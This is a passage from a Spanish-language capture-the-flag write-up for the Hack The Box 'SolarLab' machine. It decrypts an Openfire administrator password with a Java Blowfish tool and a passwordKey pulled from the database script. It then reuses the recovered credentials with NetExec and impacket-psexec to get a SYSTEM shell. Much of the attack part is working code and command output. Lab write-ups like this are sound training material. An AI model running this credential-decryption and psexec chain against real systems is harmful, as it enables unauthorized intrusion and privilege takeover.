+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> OFUSER <span style="color:#66d9ef">VALUES</span>(<span style="color:#e6db74">&#39;admin&#39;</span>,<span style="color:#e6db74">&#39;gjMoswpK+HakPdvLIvp6eLKlYh0=&#39;</span>,<span style="color:#e6db74">&#39;9MwNQcJ9bF4YeyZDdns5gvXp620=&#39;</span>,<span style="color:#e6db74">&#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x&#39;</span>,<span style="color:#ae81ff">4096</span>,<span style="color:#66d9ef">NULL</span>,<span style="color:#e6db74">&#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442&#39;</span>,<span style="color:#e6db74">&#39;Administrator&#39;</span>,<span style="color:#e6db74">&#39;admin@solarlab.htb&#39;</span>,<span style="color:#e6db74">&#39;001700223740785&#39;</span>,<span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span></code></pre></div><p>Así que tenemos una pwd encriptada.
+<code>becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442</code></p>
+<p>Haciendo una búsqueda rápida en Google, podemos encontrar este repositorio que nos indica como podemos desencriptar esta credencial.
+<a href="https://github.com/c0rdis/openfire_decrypt">openfire_decrypt</a></p>
+<h1 id="crackeando-la-contraseña-del-usuario-administrador">Crackeando la contraseña del usuario administrador</h1>
+<p>Analizando el código del script adjuntado, vemos que se utiliza una clave secreta para encriptar las pwd, por lo cual, también debe rondar por la base de datos.
+<code>SecretKeySpec key  = new SecretKeySpec (keyParam, &quot;Blowfish&quot;)</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.crypto.Cipher;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.security.MessageDigest;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.crypto.spec.SecretKeySpec;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.crypto.spec.IvParameterSpec;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">OpenFireDecryptPass</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> argv) <span style="color:#66d9ef">throws</span> Exception
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (argv.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&lt;</span> 2)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;[-] Please specify the encypted password and the \&#34;passwordKey\&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    MessageDigest md <span style="color:#f92672">=</span> MessageDigest.<span style="color:#a6e22e">getInstance</span> (<span style="color:#e6db74">&#34;SHA-1&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> keyParam <span style="color:#f92672">=</span> md.<span style="color:#a6e22e">digest</span> (argv<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>.<span style="color:#a6e22e">getBytes</span> (<span style="color:#e6db74">&#34;utf8&#34;</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> ivBytes  <span style="color:#f92672">=</span> hex2bytes (argv<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>.<span style="color:#a6e22e">substring</span> (0, 16));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> encryptedString <span style="color:#f92672">=</span> hex2bytes (argv<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>.<span style="color:#a6e22e">substring</span> (16)); <span style="color:#75715e">// 8 * 2 (since hex)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    IvParameterSpec iv <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> IvParameterSpec (ivBytes);
+</span></span><span style="display:flex;"><span>    SecretKeySpec key  <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SecretKeySpec (keyParam, <span style="color:#e6db74">&#34;Blowfish&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Cipher cipher <span style="color:#f92672">=</span> Cipher.<span style="color:#a6e22e">getInstance</span> (<span style="color:#e6db74">&#34;Blowfish/CBC/PKCS5Padding&#34;</span>);
+</span></span><span style="display:flex;"><span>    cipher.<span style="color:#a6e22e">init</span> (Cipher.<span style="color:#a6e22e">DECRYPT_MODE</span>, key, iv);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> decrypted <span style="color:#f92672">=</span> cipher.<span style="color:#a6e22e">doFinal</span> (encryptedString);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    String decryptedString <span style="color:#f92672">=</span> bytes2hex (decrypted);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span> (<span style="color:#66d9ef">new</span> String(decrypted) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; (hex: &#34;</span> <span style="color:#f92672">+</span> decryptedString <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;)&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">hex2bytes</span>(String str)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (str <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">||</span> str.<span style="color:#a6e22e">length</span>() <span style="color:#f92672">&lt;</span> 2) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> len <span style="color:#f92672">=</span> str.<span style="color:#a6e22e">length</span>() <span style="color:#f92672">/</span> 2;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> buffer <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>len<span style="color:#f92672">]</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> len; i<span style="color:#f92672">++</span>) buffer<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">byte</span>) Integer.<span style="color:#a6e22e">parseInt</span>(str.<span style="color:#a6e22e">substring</span>(i <span style="color:#f92672">*</span> 2, i <span style="color:#f92672">*</span> 2 <span style="color:#f92672">+</span> 2), 16);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> buffer;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">bytes2hex</span>(<span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> data)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (data <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">int</span> len <span style="color:#f92672">=</span> data.<span style="color:#a6e22e">length</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      String str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> len; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ((data<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">&amp;</span> 0xFF) <span style="color:#f92672">&lt;</span> 16) str <span style="color:#f92672">=</span> str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#f92672">+</span> java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Integer</span>.<span style="color:#a6e22e">toHexString</span>(data<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">&amp;</span> 0xFF);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> str <span style="color:#f92672">=</span> str <span style="color:#f92672">+</span> java.<span style="color:#a6e22e">lang</span>.<span style="color:#a6e22e">Integer</span>.<span style="color:#a6e22e">toHexString</span>(data<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> <span style="color:#f92672">&amp;</span> 0xFF);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> str.<span style="color:#a6e22e">toUpperCase</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Revisando otra vez el <code>openfire.script</code> encontramos lo que buscabamos.
+<code>INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)</code></p>
+<p>Ahora, primero compilamos el script y luego le pasamos como argumentos posicionales el hash encontrado y acto seguido la clave secreta.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  content javac OpenFireDecryptPass.java
+</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span style="color:#f92672">=</span>on -Dswing.aatext<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>➜  content java OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
+</span></span><span style="display:flex;"><span>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span style="color:#f92672">=</span>on -Dswing.aatext<span style="color:#f92672">=</span>true
+</span></span><span style="display:flex;"><span>ThisPasswordShouldDo!@ <span style="color:#f92672">(</span>hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h1 id="consiguiendo-una-shell-como-administrator">Consiguiendo una shell como Administrator</h1>
+<p>Entonces, ahora podemos probar estas credenciales para el usuario <code>Administrator</code> a ver si se reutilizan las credenciales..</p>
+<p>Y con <code>NetExec</code> podemos comprobar que son válidas, así que ahora con <code>impacket-psexec</code> podemos conseguir una consola como <code>nt\authority system</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  content nxc smb 10.129.231.39 -u <span style="color:#e6db74">&#39;Administrator&#39;</span> -p <span style="color:#e6db74">&#39;ThisPasswordShouldDo!@&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.231.39   <span style="color:#ae81ff">445</span>    SOLARLAB         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">19041</span> x64 <span style="color:#f92672">(</span>name:SOLARLAB<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:solarlab<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:False<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         10.129.231.39   <span style="color:#ae81ff">445</span>    SOLARLAB         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> solarlab<span style="color:#ae81ff">\A</span>dministrator:ThisPasswordShouldDo!@ <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>➜  content impacket-psexec solarlab.htb/Administrator:<span style="color:#e6db74">&#39;ThisPasswordShouldDo!@&#39;</span>@10.129.231.39
+</span></span><span style="display:flex;"><span>Impacket v0.12.0.dev1+20240711.104209.512a1db5 - Copyright <span style="color:#ae81ff">2023</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting shares on 10.129.231.39.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found writable share ADMIN$
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Uploading file uLpOgqoX.exe
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Opening SVCManager on 10.129.231.39.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating service olGN on 10.129.231.39.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting service olGN.....
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
+</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.19045.4355<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>Feliz Hacking! 🚀</p>
+
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; 2024, Andrés Del Cerro
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
